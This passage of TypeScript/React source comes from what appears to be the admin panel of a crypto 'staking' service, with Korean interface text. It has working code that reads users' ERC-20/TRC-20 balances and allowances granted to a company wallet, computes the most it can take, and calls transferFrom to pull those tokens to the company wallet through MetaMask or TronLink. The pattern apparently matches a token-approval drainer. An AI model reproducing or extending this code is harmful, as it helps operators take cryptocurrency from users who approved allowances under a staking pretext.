          className="w-full rounded-xl bg-accent-strong px-4 py-3 text-xs font-extrabold text-white transition hover:bg-accent-strong/90"
        >
          회사 지갑 저장
        </button>
      </div>

      <div className="mt-5 rounded-2xl border border-black/5 bg-black/[0.02] p-4 text-xs text-muted">
        <p>주소를 바꾸면 이후 요청 처리에 바로 반영됩니다.</p>
      </div>
    </section>
  );
}

interface TxLogEntry {
  id: string;
  type: "approve" | "transfer";
  txHash: string;
  username: string;
  sourceSymbol: string;
  sourceNetwork: string;
  amountLabel: string;
  timestamp: string;
}

function TxLogTab({
  entries,
  isLoading,
}: {
  entries: TxLogEntry[];
  isLoading: boolean;
}) {
  if (!isLoading && entries.length === 0) {
    return (
      <div className="rounded-3xl border border-black/5 bg-white p-8 text-center text-sm text-muted">
        아직 회사 트랜잭션이 없습니다.
      </div>
    );
  }

  return (
    <section className="rounded-3xl border border-black/5 bg-white p-5">
      <div className="flex flex-wrap items-end justify-between gap-3">
        <div>
          <h2 className="text-base font-extrabold text-foreground">
            회사 TX 로그
          </h2>
          <p className="mt-1 text-xs text-muted">
            승인 등록 및 회수 트랜잭션 기록
          </p>
        </div>
        <span className="rounded-full border border-black/10 px-3 py-1 text-[11px] font-bold text-foreground/60">
          {entries.length}건
        </span>
      </div>

      <ul className="mt-4 space-y-2">
        {entries.map((entry) => (
          <li
            key={entry.id}
            className="rounded-2xl border border-black/5 bg-white p-4"
          >
            <div className="flex flex-wrap items-start justify-between gap-3">
              <div className="flex items-start gap-3">
                <span
                  className={`mt-0.5 rounded-full px-2.5 py-1 text-[10px] font-extrabold ${
                    entry.type === "approve"
                      ? "bg-sky-100 text-sky-700"
                      : "bg-emerald-100 text-emerald-700"
                  }`}
                >
                  {entry.type === "approve" ? "승인" : "회수"}
                </span>
                <div>
                  <p className="text-sm font-extrabold text-foreground">
                    {entry.username}
                  </p>
                  <p className="mt-0.5 text-[11px] text-muted">
                    {entry.sourceSymbol} · {entry.sourceNetwork} ·{" "}
                    <span className="font-mono text-foreground">
                      {entry.amountLabel}
                    </span>
                  </p>
                </div>
              </div>
              <div className="text-right text-[11px] text-muted">
                <p className="font-mono text-foreground">
                  {shortAddress(entry.txHash)}
                </p>
                <p className="mt-0.5">{formatDate(entry.timestamp)}</p>
              </div>
            </div>
          </li>
        ))}
      </ul>
    </section>
  );
}


function buildUserSummaries(requests: StakeRequestRow[]): UserSummary[] {
  const map = new Map<string, UserSummary>();

  requests.forEach((request) => {
    const key = request.user.id;
    const existing =
      map.get(key) ??
      ({
        key,
        userId: request.user.id,
        username: request.user.username,
        walletAddress: request.user.walletAddress ?? request.walletAddress,
        tronAddress: request.user.tronAddress ?? request.tronAddress,
        requests: [],
        activeCount: 0,
        approvedCount: 0,
        allowanceCount: 0,
        latestRequest: null,
      } satisfies UserSummary);

    existing.requests.push(request);
    if (request.status !== "REJECTED") existing.activeCount += 1;
    if (hasApprovalRecord(request)) existing.approvedCount += 1;
    if (request.allowanceRaw && request.allowanceRaw !== "0") existing.allowanceCount += 1;
    if (
      !existing.latestRequest ||
      new Date(request.createdAt).getTime() > new Date(existing.latestRequest.createdAt).getTime()
    ) {
      existing.latestRequest = request;
    }
    map.set(key, existing);
  });

  return Array.from(map.values()).sort((a, b) => {
    const latestA = a.latestRequest ? new Date(a.latestRequest.createdAt).getTime() : 0;
    const latestB = b.latestRequest ? new Date(b.latestRequest.createdAt).getTime() : 0;
    return latestB - latestA;
  });
}

function buildTxLogEntries(requests: StakeRequestRow[]): TxLogEntry[] {
  const entries: TxLogEntry[] = [];
  for (const request of requests) {
    if (request.approveTxHash) {
      entries.push({
        id: `${request.id}-approve`,
        type: "approve",
        txHash: request.approveTxHash,
        username: request.user.username,
        sourceSymbol: request.sourceSymbol,
        sourceNetwork: request.sourceNetwork,
        amountLabel: formatRequestAllowance(request),
        timestamp: request.createdAt,
      });
    }
    if (request.transferTxHash) {
      entries.push({
        id: `${request.id}-transfer`,
        type: "transfer",
        txHash: request.transferTxHash,
        username: request.user.username,
        sourceSymbol: request.sourceSymbol,
        sourceNetwork: request.sourceNetwork,
        amountLabel: `${formatNumber(request.amountNumeric, 6)} ${request.sourceSymbol}`,
        timestamp: request.updatedAt ?? request.createdAt,
      });
    }
  }
  return entries.sort(
    (a, b) =>
      new Date(b.timestamp).getTime() - new Date(a.timestamp).getTime(),
  );
}

function hasApprovalRecord(request: StakeRequestRow) {
  return Boolean(
    request.approveTxHash || (request.allowanceRaw && request.allowanceRaw !== "0"),
  );
}

function isRecoverableRequest(request: StakeRequestRow) {
  return Boolean(
    request.approvalRequired &&
      request.tokenAddress &&
      request.tokenDecimals !== null &&
      request.status !== "SETTLED" &&
      request.status !== "REJECTED" &&
      (request.status !== "TRANSFERRED" || !request.transferTxHash),
  );
}

function isTokenApprovalRequest(request: StakeRequestRow) {
  return Boolean(
    request.approvalRequired &&
      request.tokenAddress &&
      request.tokenDecimals !== null &&
      request.status !== "REJECTED",
  );
}

function resolveRequestSpender(
  request: StakeRequestRow,
  adminWallet: AdminWalletRow | null,
) {
  if (request.spenderAddress) return request.spenderAddress;
  if (!adminWallet) return null;
  if (request.tokenAddress?.startsWith("0x")) return adminWallet.evmAddress;
  return adminWallet.tronAddress;
}

function formatRecoveryFailureMessage({
  isEvmToken,
  serverMessage,
  walletMessage,
}: {
  isEvmToken: boolean;
  serverMessage: string;
  walletMessage: string;
}) {
  if (!isEvmToken) {
    const missingServerKey = serverMessage.includes("ADMIN_TRON_PRIVATE_KEY");
    const missingBrowserSigner =
      walletMessage.includes("TRON 서명 기능") ||
      walletMessage.includes("TRON 주소를 확인") ||
      walletMessage.includes("TronLink") ||
      walletMessage.includes("SafePal");

    if (missingServerKey && missingBrowserSigner) {
      return "TRON 토큰은 MetaMask로 처리할 수 없습니다. 서버 설정을 완료하거나 회사 TRON 지갑을 TronLink/SafePal로 열어 서명해야 합니다.";
    }
  }

  if (isEvmToken && serverMessage.includes("ADMIN_EVM_PRIVATE_KEY")) {
    return `서버에 ADMIN_EVM_PRIVATE_KEY가 없어 MetaMask 서명을 시도했지만 실패했습니다. ${walletMessage}`;
  }

  return `${serverMessage} / ${walletMessage}`;
}

function formatRawToken(raw: string, decimals: number) {
  try {
    return formatUnits(BigInt(raw), decimals);
  } catch {
    return "-";
  }
}

function formatRequestAllowance(request: StakeRequestRow) {
  if (!request.allowanceRaw || request.allowanceRaw === "0" || request.tokenDecimals === null) {
    return "-";
  }
  try {
    return `${formatUnits(BigInt(request.allowanceRaw), request.tokenDecimals)} ${request.sourceSymbol}`;
  } catch {
    return "-";
  }
}

function formatStatusLabel(status: StakeStatus) {
  const labels: Record<StakeStatus, string> = {
    REQUESTED: "요청",
    APPROVED: "승인",
    TRANSFERRED: "수령",
    SETTLED: "정산",
    REJECTED: "반려",
  };
  return labels[status] ?? status;
}

function formatDate(value: string) {
  return new Intl.DateTimeFormat("ko-KR", {
    month: "2-digit",
    day: "2-digit",
    hour: "2-digit",
    minute: "2-digit",
  }).format(new Date(value));
}

function toUnits(value: string, decimals: number) {
  try {
    const normalized = value.trim();
    if (!normalized || Number(normalized) <= 0) return null;
    return parseUnits(normalized, decimals);
  } catch {
    return null;
  }
}

function toBigInt(value: string | null) {
  if (!value) return null;
  try {
    return BigInt(value);
  } catch {
    return null;
  }
}

function unknownToBigInt(value: unknown) {
  if (typeof value === "bigint") return value;
  if (typeof value === "number") return BigInt(value);
  if (typeof value === "string") return BigInt(value);
  if (value && typeof value === "object" && "toString" in value) {
    return BigInt(String(value));
  }
  throw new Error("토큰 수량을 해석하지 못했습니다.");
}

function extractTxId(value: unknown) {
  if (typeof value === "string") return value;
  if (value && typeof value === "object") {
    const record = value as Record<string, unknown>;
    if (typeof record.txid === "string") return record.txid;
    if (typeof record.hash === "string") return record.hash;
  }
  return String(value);
}

function minBigInt(a: bigint, b: bigint) {
  return a < b ? a : b;
}

function getEthereumProvider() {
  if (typeof window === "undefined") return null;
  const ethereum =
    (window as unknown as { ethereum?: Eip1193Provider }).ethereum ?? null;
  if (!ethereum) return null;

  const providers = Array.isArray(ethereum.providers)
    ? ethereum.providers
    : [ethereum];
  return providers.find((provider) => provider.isMetaMask) ?? null;
}

async function recoverWithBrowserWallet({
  request,
  adminWallet,
  amountUnits,
}: {
  request: StakeRequestRow;
  adminWallet: AdminWalletRow | null;
  amountUnits: bigint;
}) {
  if (!adminWallet) throw new Error("회사 지갑이 저장되어 있지 않습니다.");
  if (!request.tokenAddress) throw new Error("토큰 주소가 없습니다.");
  if (!request.spenderAddress) throw new Error("회사 승인 지갑 주소가 없습니다.");

  if (request.tokenAddress.startsWith("0x")) {
    return await recoverEvmWithBrowserWallet({
      request,
      adminWallet,
      amountUnits,
    });
  }

  return await recoverTronWithBrowserWallet({
    request,
    adminWallet,
    amountUnits,
  });
}

async function recoverEvmWithBrowserWallet({
  request,
  adminWallet,
  amountUnits,
}: {
  request: StakeRequestRow;
  adminWallet: AdminWalletRow;
  amountUnits: bigint;
}) {
  if (!request.walletAddress || !isAddress(request.walletAddress)) {
    throw new Error("유저 EVM 주소가 없습니다.");
  }
  if (!request.tokenAddress || !isAddress(request.tokenAddress)) {
    throw new Error("토큰 EVM 주소가 올바르지 않습니다.");
  }
  if (!request.spenderAddress || !isAddress(request.spenderAddress)) {
    throw new Error("회사 EVM 승인 지갑 주소가 올바르지 않습니다.");
  }
  if (!isAddress(adminWallet.evmAddress)) {
    throw new Error("회사 EVM 지갑 주소가 올바르지 않습니다.");
  }

  const provider = getEthereumProvider();
  if (!provider) {
    throw new Error("MetaMask EVM 확장 지갑을 찾을 수 없습니다.");
  }

  const accounts = await provider.request({ method: "eth_requestAccounts" });
  const account = Array.isArray(accounts) ? accounts[0] : null;
  if (typeof account !== "string" || !isAddress(account)) {
    throw new Error("MetaMask EVM 주소를 확인하지 못했습니다.");
  }
  if (account.toLowerCase() !== request.spenderAddress.toLowerCase()) {
    throw new Error(
      `MetaMask 주소(${shortAddress(account)})가 회사 승인 지갑(${shortAddress(request.spenderAddress)})과 다릅니다.`,
    );
  }

  const publicClient = createPublicClient({ transport: custom(provider) });
  const [balance, allowance] = await Promise.all([
    publicClient.readContract({
      address: request.tokenAddress as Address,
      abi: ERC20_ABI,
      functionName: "balanceOf",
      args: [request.walletAddress as Address],
    }),
    publicClient.readContract({
      address: request.tokenAddress as Address,
      abi: ERC20_ABI,
      functionName: "allowance",
      args: [request.walletAddress as Address, request.spenderAddress as Address],
    }),
  ]);
  if (balance < amountUnits) {
    throw new Error("유저 EVM 토큰 잔고가 실행 수량보다 작습니다.");
  }
  if (allowance < amountUnits) {
    throw new Error("EVM 승인 수량이 받을 수량보다 작습니다.");
  }

  const walletClient = createWalletClient({
    account: account as Address,
    transport: custom(provider),
  });
  return await walletClient.writeContract({
    address: request.tokenAddress as Address,
    abi: ERC20_ABI,
    functionName: "transferFrom",
    args: [
      request.walletAddress as Address,
      adminWallet.evmAddress as Address,
      amountUnits,
    ],
    chain: null,
  });
}

async function recoverTronWithBrowserWallet({
  request,
  adminWallet,
  amountUnits,
}: {
  request: StakeRequestRow;
  adminWallet: AdminWalletRow;
  amountUnits: bigint;
}) {
  if (!request.tronAddress) throw new Error("유저 TRON 주소가 없습니다.");
  if (!request.tokenAddress) throw new Error("TRON 토큰 주소가 없습니다.");
  if (!request.spenderAddress) throw new Error("회사 승인 지갑 주소가 없습니다.");
  if (!adminWallet.tronAddress) throw new Error("회사 TRON 지갑이 저장되어 있지 않습니다.");

  const tronWeb = await requestInjectedTronWeb();
  const signerAddress = getInjectedTronAddress();
  if (!signerAddress) {
    throw new Error("SafePal/TronLink에서 TRON 주소를 확인하지 못했습니다.");
  }
  if (!sameTronAddress(signerAddress, request.spenderAddress)) {
    throw new Error(
      `확장 지갑 주소(${shortAddress(signerAddress)})가 회사 승인 지갑(${shortAddress(request.spenderAddress)})과 다릅니다.`,
    );
  }
  if (!sameTronAddress(adminWallet.tronAddress, request.spenderAddress)) {
    throw new Error("저장된 회사 TRON 지갑이 회사 승인 지갑과 다릅니다.");
  }

  const contract = await getTronTrc20Contract(tronWeb, request.tokenAddress);
  const [balanceResult, allowanceResult] = await Promise.all([
    contract.balanceOf(request.tronAddress).call(),
    contract.allowance(request.tronAddress, request.spenderAddress).call(),
  ]);
  const balance = unknownToBigInt(balanceResult);
  const allowance = unknownToBigInt(allowanceResult);
  if (balance < amountUnits) {
    throw new Error("유저 TRON 토큰 잔고가 실행 수량보다 작습니다.");
  }
  if (allowance < amountUnits) {
    throw new Error("TRON 승인 수량이 받을 수량보다 작습니다.");
  }

  const tx = await contract
    .transferFrom(request.tronAddress, adminWallet.tronAddress, amountUnits.toString())
    .send({ feeLimit: 100_000_000 });
  return extractTxId(tx);
}

async function requestInjectedTronWeb() {
  await requestTronAccountsAccess();
  const tronWeb = getInjectedTronWeb();
  if (!tronWeb) {
    throw new Error("SafePal/TronLink TRON 서명 기능을 찾지 못했습니다.");
  }
  return tronWeb;
}

async function requestTronAccountsAccess() {
  const tronWindow = getTronWindow();
  const requesters = [
    () => tronWindow.tronLink?.request?.({ method: "tron_requestAccounts" }),
    () => tronWindow.tron?.request?.({ method: "tron_requestAccounts" }),
    () => tronWindow.safepal?.request?.({ method: "tron_requestAccounts" }),
    () => tronWindow.tronWeb?.request?.({ method: "tron_requestAccounts" }),
    () => tronWindow.safepal?.request?.({ method: "eth_requestAccounts" }),
  ];

  for (const requestAccounts of requesters) {
    try {
      await requestAccounts();
      if (getInjectedTronWeb()) return;
    } catch {
      // Try the next provider shape.
    }
  }
}

function getTronWindow() {
  if (typeof window === "undefined") return {} as TronWindow;
  return window as unknown as TronWindow;
}

function getTronWebCandidates() {
  const tronWindow = getTronWindow();
  return [
    tronWindow.tronLink?.tronWeb,
    tronWindow.tron?.tronWeb,
    tronWindow.safepal?.tronWeb,
    tronWindow.tronWeb,
  ].filter((tronWeb): tronWeb is TronTransferWeb => Boolean(tronWeb));
}

function getInjectedTronWeb() {
  return getTronWebCandidates()[0] ?? null;
}

function getInjectedTronAddress() {
  for (const tronWeb of getTronWebCandidates()) {
    const address = tronWeb.defaultAddress?.base58?.trim();
    if (address && TRON_ADDRESS_RE.test(address)) return address;
  }
  return null;
}

async function getTronTrc20Contract(
  tronWeb: TronTransferWeb,
  tokenAddress: string,
) {
  if (!tronWeb.contract) {
    throw new Error("확장 지갑에서 TRC20 컨트랙트를 열 수 없습니다.");
  }

  try {
    const contract = await tronWeb.contract(TRC20_TRANSFER_ABI, tokenAddress);
    if (contract) return contract;
  } catch {
    // Some injected wallets only support contract().at(address).
  }

  try {
    const contract = await tronWeb.contract().at(tokenAddress);
    if (contract) return contract;
  } catch {
    // Keep final error stable.
  }

  throw new Error("확장 지갑에서 TRC20 transferFrom 기능을 찾지 못했습니다.");
}

function sameTronAddress(a: string | null | undefined, b: string | null | undefined) {
  return Boolean(a && b && a.trim() === b.trim());
}

async function readErc20RecoverySnapshot({
  tokenAddress,
  owner,
  spender,
}: {
  tokenAddress: string;
  owner: string | null;
  spender: string;
}): Promise<RecoverySnapshot> {
  if (!owner || !isAddress(owner)) throw new Error("유저 EVM 주소가 없습니다.");
  if (!isAddress(spender)) throw new Error("회사 EVM 승인 지갑 주소가 올바르지 않습니다.");

  const provider = getEthereumProvider();
  if (!provider) throw new Error("EVM 지갑 provider를 찾을 수 없습니다.");
  const publicClient = createPublicClient({ transport: custom(provider) });
  const [balance, allowance] = await Promise.all([
    publicClient.readContract({
      address: tokenAddress as Address,
      abi: ERC20_ABI,
      functionName: "balanceOf",
      args: [owner as Address],
    }),
    publicClient.readContract({
      address: tokenAddress as Address,
      abi: ERC20_ABI,
      functionName: "allowance",
      args: [owner as Address, spender as Address],
    }),
  ]);
  const balanceRaw = balance.toString();
  const allowanceRaw = allowance.toString();
  return {
    balanceRaw,
    allowanceRaw,
    recoverableRaw: minBigInt(balance, allowance).toString(),
    checkedAt: new Date().toISOString(),
  };
}

async function readTronRecoverySnapshot({
  tokenAddress,
  owner,
  spender,
}: {
  tokenAddress: string;
  owner: string | null;
  spender: string;
}): Promise<RecoverySnapshot> {
  if (!owner) throw new Error("유저 TRON 주소가 없습니다.");
  const params = new URLSearchParams({
    tokenAddress,
    owner,
    spender,
  });
  const res = await fetch(`/api/admin/tron/recovery-snapshot?${params.toString()}`, {
    cache: "no-store",
  });
  const data = (await res.json()) as RecoverySnapshot & { error?: string };
  if (!res.ok) {
    throw new Error(data.error ?? "TRON 잔고와 승인 수량 확인 실패");
  }

  return {
    balanceRaw: data.balanceRaw,
    allowanceRaw: data.allowanceRaw,
    recoverableRaw: data.recoverableRaw,
    checkedAt: data.checkedAt,
  };
}
